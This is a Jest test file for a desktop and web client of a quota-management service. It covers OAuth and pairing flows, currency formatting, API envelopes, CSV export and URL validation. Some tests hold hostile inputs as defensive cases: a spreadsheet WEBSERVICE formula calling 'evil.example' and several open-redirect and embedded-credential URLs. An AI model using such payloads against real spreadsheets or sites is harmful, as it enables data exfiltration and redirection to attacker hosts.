jest.mock("@/lib/tauri/commands", () => ({
  moreTokenCredentialState: jest.fn(),
  moreTokenForgetCredential: jest.fn(),
  moreTokenListInstances: jest.fn(),
  moreTokenManagementStepUpStart: jest.fn(),
  moreTokenManagementStepUpPoll: jest.fn(),
  moreTokenManagementStepUpCancel: jest.fn(),
  moreTokenPair: jest.fn(),
  moreTokenPersonalLogin: jest.fn(),
  moreTokenPersonalOAuthStart: jest.fn(),
  moreTokenPersonalOAuthPoll: jest.fn(),
  moreTokenPersonalOAuthCancel: jest.fn(),
  moreTokenRemoveInstance: jest.fn(),
  moreTokenRequest: jest.fn(),
  moreTokenSaveInstance: jest.fn(),
  writeTextFile: jest.fn(),
}))
jest.mock("@/lib/tauri", () => ({ isTauri: jest.fn(() => false) }))
jest.mock("@/lib/tauri/dialog", () => ({ pickSavePath: jest.fn() }))

import { isTauri } from "@/lib/tauri"
import { moreTokenRequest, writeTextFile } from "@/lib/tauri/commands"
import { pickSavePath } from "@/lib/tauri/dialog"
import {
  createMemoryMoreTokenPort,
  hasInjectedMoreTokenPort,
  setMoreTokenPortForTests,
} from "./port"
import type { MoreTokenPort } from "./port"
import {
  cancelManagementStepUp,
  cancelPersonalOAuth,
  credentialState,
  forgetCredential,
  loginPersonalInstance,
  pairInstance,
  pollManagementStepUp,
  pollPersonalOAuth,
  quotaLabel,
  removeInstance,
  saveInstance,
  startManagementStepUp,
  startPersonalOAuth,
  csvText,
  downloadCsv,
  escapeCsvCell,
  ManagementApiError,
  managementRequest,
  listInstances,
  operationId,
  quotaCurrencyLabel,
  quotaCurrencyParts,
  quotaDisplayAmount,
  sameOriginServerUrl,
} from "./client"

afterEach(() => setMoreTokenPortForTests(null))

it("supports an isolated in-memory adapter for browser tests", async () => {
  setMoreTokenPortForTests(
    createMemoryMoreTokenPort({
      listInstances: async () => [
        {
          id: "memory",
          name: "Memory",
          baseUrl: "https://memory.example",
          caFingerprint: null,
          readOnly: false,
          displayCurrency: "USD",
          package: "management",
        },
      ],
    })
  )
  await expect(listInstances()).resolves.toHaveLength(1)
  expect(hasInjectedMoreTokenPort()).toBe(true)
})

it("does not report the Tauri port as an injected browser runtime", () => {
  expect(hasInjectedMoreTokenPort()).toBe(false)
})

it("blocks spreadsheet formulas in CSV exports", () => {
  expect(escapeCsvCell('=WEBSERVICE("https://evil.example")')).toBe(
    '"\'=WEBSERVICE(""https://evil.example"")"'
  )
  expect(escapeCsvCell("safe")).toBe("safe")
})

it("saves CSV through the native dialog on desktop, where a blob download does nothing", async () => {
  ;(isTauri as jest.Mock).mockReturnValue(true)
  ;(pickSavePath as jest.Mock).mockResolvedValueOnce("/tmp/ledger.csv")
  await expect(downloadCsv("ledger.csv", [["id"], [1]])).resolves.toEqual({
    kind: "saved",
    path: "/tmp/ledger.csv",
  })
  expect(writeTextFile).toHaveBeenCalledWith("/tmp/ledger.csv", csvText([["id"], [1]]))

  ;(pickSavePath as jest.Mock).mockResolvedValueOnce(null)
  await expect(downloadCsv("ledger.csv", [["id"]])).resolves.toEqual({ kind: "cancelled" })
  expect(writeTextFile).toHaveBeenCalledTimes(1)
  ;(isTauri as jest.Mock).mockReturnValue(false)
})

it("writes a BOM-prefixed body with formula-safe cells", () => {
  expect(
    csvText([
      ["a", "=1+1"],
      [2, "x,y"],
    ])
  ).toBe('\ufeffa,\'=1+1\n2,"x,y"')
})

it("only opens same-origin absolute server paths", () => {
  expect(sameOriginServerUrl("https://more-token.example/base", "/console/topup")).toBe(
    "https://more-token.example/console/topup"
  )
  expect(() => sameOriginServerUrl("https://more-token.example", "//evil.example/path")).toThrow(
    "SERVER_URL_NOT_ALLOWED"
  )
  expect(() =>
    sameOriginServerUrl("https://more-token.example", "https://evil.example/path")
  ).toThrow("SERVER_URL_NOT_ALLOWED")
})

it("creates UUIDv7 operation identifiers", () => {
  const id = operationId()
  expect(id).toMatch(/^[0-9a-f]{8}-[0-9a-f]{4}-7[0-9a-f]{3}-[89ab][0-9a-f]{3}-[0-9a-f]{12}$/)
})

it("converts raw quota into the configured display currency", () => {
  const display = {
    quota_per_unit: 500_000,
    display_currency: "USD",
    conversion_numerator: 7,
    conversion_denominator: 1,
    rate_valid_until: Math.floor(Date.now() / 1000) + 60,
    version: 1,
  }
  expect(quotaDisplayAmount(500_000, display)).toBe(7)
  expect(quotaDisplayAmount(38_000, display)).toBeCloseTo(0.532)
  expect(quotaCurrencyLabel(500_000, display)).toContain("7.00")
  const parts = quotaCurrencyParts(500_000, display)
  expect(parts.primary).toContain("7.00")
  expect(parts.primary).not.toContain("quota")
  expect(parts.raw).toBe("500,000 quota")
})

it("reports no separate raw half when the raw quota is the only value it can show", () => {
  const display = {
    quota_per_unit: 500_000,
    display_currency: "USD",
    conversion_numerator: 7,
    conversion_denominator: 1,
    rate_valid_until: 1,
    version: 1,
  }
  expect(quotaCurrencyParts(500_000, display)).toEqual({
    primary: "500,000 quota",
    raw: null,
  })
})

it("keeps small refunds visible instead of rounding them to negative zero", () => {
  const display = {
    quota_per_unit: 1_000,
    display_currency: "USD",
    conversion_numerator: 1,
    conversion_denominator: 1,
    rate_valid_until: Math.floor(Date.now() / 1000) + 60,
    version: 1,
  }
  const label = quotaCurrencyLabel(-4, display)
  expect(label).toMatch(/0[.,]004/)
  expect(label).not.toMatch(/-\D*0[.,]00(?!4)/)
})

it("refuses an expired monetary conversion and falls back to quota units", () => {
  const display = {
    quota_per_unit: 500_000,
    display_currency: "USD",
    conversion_numerator: 7,
    conversion_denominator: 1,
    rate_valid_until: 1,
    version: 1,
  }
  expect(quotaDisplayAmount(500_000, display)).toBeNull()
  expect(quotaCurrencyLabel(500_000, display)).toBe("500,000 quota")
})

it("unwraps a successful management envelope", async () => {
  ;(moreTokenRequest as jest.Mock).mockResolvedValue({
    status: 200,
    body: {
      success: true,
      data: {
        management_api_version: 2,
        minimum_desktop_version: "0.16.0",
        role: "admin",
        scopes: [],
        features: {
          management_api_enabled: true,
          personal_api_enabled: true,
          quota_transfer_enabled: true,
          quota_policy_automation_enabled: true,
          distribution_detail_enabled: true,
          step_up_required: true,
          account_invites_enabled: true,
          remote_revoke_enabled: true,
        },
        quota_display: {
          quota_per_unit: 500_000,
          display_currency: "USD",
          conversion_numerator: 1,
          conversion_denominator: 1,
          rate_valid_until: 0,
          version: 1,
        },
        quota_display_version: "2",
      },
      request_id: "req-1",
      server_time: 1,
    },
  })
  await expect(managementRequest("primary", { kind: "capabilities" })).resolves.toMatchObject({
    data: { role: "admin" },
    request_id: "req-1",
  })
})

it("rejects a success envelope whose operation data does not match the contract", async () => {
  ;(moreTokenRequest as jest.Mock).mockResolvedValue({
    status: 200,
    body: { success: true, data: { role: "admin" }, request_id: "req-invalid", server_time: 1 },
  })
  await expect(managementRequest("primary", { kind: "capabilities" })).rejects.toMatchObject({
    code: "INVALID_SERVER_RESPONSE",
  })
})

it("accepts signed deltas in personal ledger responses", async () => {
  ;(moreTokenRequest as jest.Mock).mockResolvedValue({
    status: 200,
    body: {
      success: true,
      data: {
        items: [
          {
            id: 7,
            operation_id: "0198fefe-1111-7111-8111-111111111111",
            type: "transfer",
            amount: 25,
            delta: -25,
            balance_before: 100,
            balance_after: 75,
            counterparty: "child-a",
            reason: "allocation",
            status: "committed",
            created_at: 1_700_000_000,
          },
        ],
        page: 1,
        page_size: 20,
        total: 1,
      },
      request_id: "req-ledger",
      server_time: 1,
    },
  })

  await expect(
    managementRequest<{ items: Array<{ delta: number }> }>("personal", {
      kind: "personalLedger",
      page: 1,
      pageSize: 20,
    })
  ).resolves.toMatchObject({ data: { items: [{ delta: -25 }] } })
})

it("accepts system audit events without an authenticated actor", async () => {
  ;(moreTokenRequest as jest.Mock).mockResolvedValue({
    status: 200,
    body: {
      success: true,
      data: {
        items: [
          {
            id: 8,
            actor_id: 0,
            action: "management_request_denied",
            resource_type: "route",
            resource_id: "GET /api/distribution/accounts",
            reason: "management authentication required",
            request_id: "req-denied",
            error_code: "AUTH_EXPIRED",
            created_at: 1_700_000_000,
          },
        ],
        page: 1,
        page_size: 20,
        total: 1,
      },
      request_id: "req-audit",
      server_time: 1,
    },
  })

  await expect(
    managementRequest<{ items: Array<{ actor_id: number }> }>("primary", {
      kind: "auditEvents",
      page: 1,
      pageSize: 20,
    })
  ).resolves.toMatchObject({ data: { items: [{ actor_id: 0 }] } })
})

it("accepts system alerts that are not tied to a rule", async () => {
  ;(moreTokenRequest as jest.Mock).mockResolvedValue({
    status: 200,
    body: {
      success: true,
      data: {
        items: [
          {
            id: 9,
            rule_id: 0,
            owner_id: 1,
            account_id: 0,
            kind: "monthly_budget",
            message: "Monthly soft budget reached",
            observed_value: 500,
            acknowledged_at: 0,
            created_at: 1_700_000_000,
          },
        ],
        page: 1,
        page_size: 20,
        total: 1,
      },
      request_id: "req-alert",
      server_time: 1,
    },
  })

  await expect(
    managementRequest<{ items: Array<{ rule_id: number }> }>("primary", {
      kind: "alertEvents",
      page: 1,
      pageSize: 20,
    })
  ).resolves.toMatchObject({ data: { items: [{ rule_id: 0 }] } })
})

it("rejects malformed operations before they reach Tauri", async () => {
  ;(moreTokenRequest as jest.Mock).mockClear()
  await expect(
    managementRequest("primary", {
      kind: "quotaTransfer",
      body: { source_id: 1, target_id: 2, amount: -1 },
    } as never)
  ).rejects.toThrow("Invalid more-token operation")
  expect(moreTokenRequest).not.toHaveBeenCalled()
})

it("preserves structured server errors", async () => {
  ;(moreTokenRequest as jest.Mock).mockResolvedValue({
    status: 409,
    body: {
      success: false,
      error: {
        code: "VERSION_CONFLICT",
        message: "preview expired",
        request_id: "req-2",
        retryable: true,
      },
    },
  })
  await expect(managementRequest("primary", { kind: "capabilities" })).rejects.toEqual(
    expect.objectContaining<Partial<ManagementApiError>>({
      code: "VERSION_CONFLICT",
      requestId: "req-2",
      retryable: true,
    })
  )
})

describe("port-backed wrappers", () => {
  function spyPort() {
    const port = createMemoryMoreTokenPort({
      saveInstance: jest.fn(async (draft) => ({ ...draft, caFingerprint: null })),
      removeInstance: jest.fn(async () => undefined),
      credentialState: jest.fn(async () => ({ connected: true, persistent: true })),
      forgetCredential: jest.fn(async () => ({
        remoteRevoked: true,
        localDeleted: true,
        remoteError: null,
      })),
      pair: jest.fn(async () => ({ tokenId: 7, expiresAt: 99, credentialPersistent: true })),
      personalLogin: jest.fn(async () => ({
        tokenId: 8,
        expiresAt: 99,
        credentialPersistent: false,
      })),
      personalOAuthStart: jest.fn(async () => ({
        handle: "h",
        authorizationUrl: "https://mt.example/authorize",
        expiresAt: 99,
        intervalSeconds: 2,
      })),
      personalOAuthPoll: jest.fn(async () => ({
        status: "authorization_pending" as const,
        credential: null,
      })),
      personalOAuthCancel: jest.fn(async () => undefined),
      managementStepUpStart: jest.fn(async () => ({
        handle: "s",
        authorizationUrl: "https://mt.example/step-up",
        expiresAt: 99,
        intervalSeconds: 2,
      })),
      managementStepUpPoll: jest.fn(async () => ({ status: "authorized" as const })),
      managementStepUpCancel: jest.fn(async () => undefined),
    })
    setMoreTokenPortForTests(port)
    return port as { [K in keyof MoreTokenPort]: jest.Mock }
  }

  it("routes instance management through the active port", async () => {
    const port = spyPort()
    const draft = {
      id: "i-1",
      name: "Team",
      baseUrl: "https://mt.example",
      readOnly: false,
      displayCurrency: null,
      customCaPath: null,
      clearCustomCa: false,
      package: "management" as const,
    }
    await expect(saveInstance(draft)).resolves.toMatchObject({ id: "i-1", caFingerprint: null })
    expect(port.saveInstance).toHaveBeenCalledWith(draft)

    await removeInstance("i-1")
    expect(port.removeInstance).toHaveBeenCalledWith("i-1")

    await expect(credentialState("i-1")).resolves.toEqual({ connected: true, persistent: true })
    expect(port.credentialState).toHaveBeenCalledWith("i-1")
  })

  it("forgets a credential remotely unless local-only is explicitly allowed", async () => {
    const port = spyPort()
    await expect(forgetCredential("i-1")).resolves.toMatchObject({ remoteRevoked: true })
    expect(port.forgetCredential).toHaveBeenLastCalledWith("i-1", false)
    await forgetCredential("i-1", true)
    expect(port.forgetCredential).toHaveBeenLastCalledWith("i-1", true)
  })

  it("identifies the desktop client by default when pairing and logging in", async () => {
    const port = spyPort()
    await expect(pairInstance("i-1", "CODE")).resolves.toMatchObject({ tokenId: 7 })
    expect(port.pair).toHaveBeenLastCalledWith("i-1", "CODE", "agentpack-desktop")
    await pairInstance("i-1", "CODE", "custom")
    expect(port.pair).toHaveBeenLastCalledWith("i-1", "CODE", "custom")

    await expect(loginPersonalInstance("i-1", "alice", "pw", "123456")).resolves.toMatchObject({
      tokenId: 8,
    })
    expect(port.personalLogin).toHaveBeenLastCalledWith(
      "i-1",
      "alice",
      "pw",
      "123456",
      "agentpack-personal-desktop",
      "AgentPack Desktop"
    )
    await loginPersonalInstance("i-1", "alice", "pw", null, "cid", "Label")
    expect(port.personalLogin).toHaveBeenLastCalledWith("i-1", "alice", "pw", null, "cid", "Label")
  })

  it("drives the personal OAuth flow by handle", async () => {
    const port = spyPort()
    await expect(startPersonalOAuth("i-1")).resolves.toMatchObject({ handle: "h" })
    expect(port.personalOAuthStart).toHaveBeenLastCalledWith(
      "i-1",
      "agentpack-personal-desktop",
      "AgentPack Desktop"
    )
    await startPersonalOAuth("i-1", "cid", "Label")
    expect(port.personalOAuthStart).toHaveBeenLastCalledWith("i-1", "cid", "Label")

    await expect(pollPersonalOAuth("i-1", "h")).resolves.toEqual({
      status: "authorization_pending",
      credential: null,
    })
    expect(port.personalOAuthPoll).toHaveBeenCalledWith("i-1", "h")
    await cancelPersonalOAuth("i-1", "h")
    expect(port.personalOAuthCancel).toHaveBeenCalledWith("i-1", "h")
  })

  it("drives the management step-up flow by handle", async () => {
    const port = spyPort()
    await expect(startManagementStepUp("i-1", "preview")).resolves.toMatchObject({ handle: "s" })
    expect(port.managementStepUpStart).toHaveBeenCalledWith("i-1", "preview")
    await expect(pollManagementStepUp("i-1", "s")).resolves.toEqual({ status: "authorized" })
    expect(port.managementStepUpPoll).toHaveBeenCalledWith("i-1", "s")
    await cancelManagementStepUp("i-1", "s")
    expect(port.managementStepUpCancel).toHaveBeenCalledWith("i-1", "s")
  })
})

describe("managementRequest edge cases", () => {
  it("refuses to send when the signal is already aborted", async () => {
    ;(moreTokenRequest as jest.Mock).mockClear()
    const controller = new AbortController()
    controller.abort()
    await expect(
      managementRequest("primary", { kind: "capabilities" }, controller.signal)
    ).rejects.toMatchObject({ name: "AbortError" })
    expect(moreTokenRequest).not.toHaveBeenCalled()
  })

  it("drops a response that arrives after the caller cancelled", async () => {
    const controller = new AbortController()
    ;(moreTokenRequest as jest.Mock).mockImplementationOnce(async () => {
      controller.abort()
      return { status: 200, body: { success: true, data: {}, request_id: "r", server_time: 1 } }
    })
    await expect(
      managementRequest("primary", { kind: "capabilities" }, controller.signal)
    ).rejects.toMatchObject({ name: "AbortError" })
  })

  it("reports a body that is not an envelope at all as an invalid server response", async () => {
    ;(moreTokenRequest as jest.Mock).mockResolvedValueOnce({ status: 502, body: "<html>" })
    await expect(managementRequest("primary", { kind: "capabilities" })).rejects.toEqual(
      expect.objectContaining<Partial<ManagementApiError>>({
        code: "INVALID_SERVER_RESPONSE",
        status: 502,
        retryable: false,
      })
    )
    ;(moreTokenRequest as jest.Mock).mockResolvedValueOnce({
      status: 200,
      body: {
        success: false,
        error: { code: "X", message: "m", request_id: "", retryable: false },
      },
    })
    await expect(managementRequest("primary", { kind: "capabilities" })).rejects.toMatchObject({
      code: "INVALID_SERVER_RESPONSE",
      status: 200,
    })
  })
})

describe("operationId without Web Crypto", () => {
  it("still produces a time-ordered UUIDv7-shaped id", () => {
    const original = Object.getOwnPropertyDescriptor(globalThis, "crypto")
    Object.defineProperty(globalThis, "crypto", { value: undefined, configurable: true })
    try {
      const id = operationId()
      expect(id).toMatch(/^[0-9a-f]{8}-[0-9a-f]{4}-7000-8000-[0-9a-f]{12}$/)
      const millis = parseInt(id.replaceAll("-", "").slice(0, 12), 16)
      expect(Math.abs(millis - Date.now())).toBeLessThan(5_000)
    } finally {
      if (original) Object.defineProperty(globalThis, "crypto", original)
    }
  })
})

describe("quota formatting", () => {
  it("expresses raw quota in units of the configured quota-per-unit", () => {
    expect(quotaLabel(750_000)).toBe("1.5")
    expect(quotaLabel(1, 3)).toBe("0.33")
    expect(quotaLabel(0)).toBe("0")
  })

  it("defaults a blank display currency to USD", () => {
    const display = {
      quota_per_unit: 500_000,
      display_currency: "",
      conversion_numerator: 1,
      conversion_denominator: 1,
      rate_valid_until: 0,
      version: 1,
    }
    expect(quotaCurrencyLabel(500_000, display)).toBe("$1.00 · 500,000 quota")
  })

  it("falls back to a plain amount when the currency code is not one Intl knows", () => {
    const display = {
      quota_per_unit: 1_000,
      display_currency: "NOT-A-CODE",
      conversion_numerator: 1,
      conversion_denominator: 1,
      rate_valid_until: 0,
      version: 1,
    }
    expect(quotaCurrencyLabel(2_500, display)).toBe("2.50 NOT-A-CODE · 2,500 quota")
    expect(quotaCurrencyLabel(5, display)).toBe("0.0050 NOT-A-CODE · 5 quota")
  })

  it("refuses non-finite values and degenerate conversion settings", () => {
    const display = {
      quota_per_unit: 500_000,
      display_currency: "USD",
      conversion_numerator: 1,
      conversion_denominator: 1,
      rate_valid_until: 0,
      version: 1,
    }
    expect(quotaDisplayAmount(Number.NaN, display)).toBeNull()
    expect(quotaDisplayAmount(1, { ...display, quota_per_unit: 0 })).toBeNull()
    expect(quotaDisplayAmount(1, { ...display, conversion_numerator: 0 })).toBeNull()
    expect(quotaDisplayAmount(1, { ...display, conversion_denominator: 0 })).toBeNull()
  })
})

describe("downloadCsv in web mode", () => {
  it("downloads through a blob link and revokes the URL only after WebKit has read it", async () => {
    jest.useFakeTimers()
    const createObjectURL = jest.fn(() => "blob:ledger")
    const revokeObjectURL = jest.fn()
    Object.assign(URL, { createObjectURL, revokeObjectURL })
    const click = jest.spyOn(HTMLAnchorElement.prototype, "click").mockImplementation(() => {})
    try {
      await expect(downloadCsv("ledger.csv", [["id"], [1]])).resolves.toEqual({
        kind: "downloaded",
      })
      expect(pickSavePath).not.toHaveBeenCalled()
      expect(createObjectURL).toHaveBeenCalledWith(expect.any(Blob))
      const anchor = click.mock.contexts[0] as HTMLAnchorElement
      expect(anchor.download).toBe("ledger.csv")
      expect(anchor.href).toBe("blob:ledger")
      expect(anchor.isConnected).toBe(false)
      expect(revokeObjectURL).not.toHaveBeenCalled()
      jest.advanceTimersByTime(60_000)
      expect(revokeObjectURL).toHaveBeenCalledWith("blob:ledger")
    } finally {
      click.mockRestore()
      jest.useRealTimers()
    }
  })
})

describe("sameOriginServerUrl hardening", () => {
  it("catches a backslash authority that slips past the leading-slash check", () => {
    expect(() => sameOriginServerUrl("https://more-token.example", "/\\evil.example/path")).toThrow(
      "SERVER_URL_NOT_ALLOWED"
    )
  })

  it("refuses embedded credentials even on the same origin", () => {
    expect(() =>
      sameOriginServerUrl("https://more-token.example", "/\\user:pw@more-token.example/x")
    ).toThrow("SERVER_URL_NOT_ALLOWED")
    expect(() =>
      sameOriginServerUrl("https://more-token.example", "/\\:pw@more-token.example/x")
    ).toThrow("SERVER_URL_NOT_ALLOWED")
  })

  it("refuses a relative path", () => {
    expect(() => sameOriginServerUrl("https://more-token.example", "console")).toThrow(
      "SERVER_URL_NOT_ALLOWED"
    )
  })
})
